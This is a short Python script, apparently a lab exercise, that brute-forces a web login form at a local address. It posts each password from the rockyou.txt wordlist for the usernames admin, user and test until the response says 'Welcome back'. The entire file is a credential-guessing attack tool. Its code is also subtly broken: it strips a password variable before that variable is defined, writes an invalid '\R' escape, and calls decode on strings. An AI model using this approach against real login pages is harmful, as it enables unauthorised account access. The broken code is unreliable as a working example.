import requests
import sys
target = "http://127.0.0.1:5000"
usernames = ["admin","user","test"]
passwords = "rockyou.txt"
needle = "Welcome back"
# For Each username in list attempt to log as long as parameters are username and password
for username in usernames:
    with open(passwords,"r") as passwords_list:
        password = password.strip("\n").encode()
        for password in passwords_list:
            sys.stdout.write("[X] Attempting user:password -> {}:{}\R".format(username,password.decode()))
            sys.stdout.flush()
            r = requests.post(target,data={"username": username,"password":password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(),username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo Password Found for '{}'!".format(username))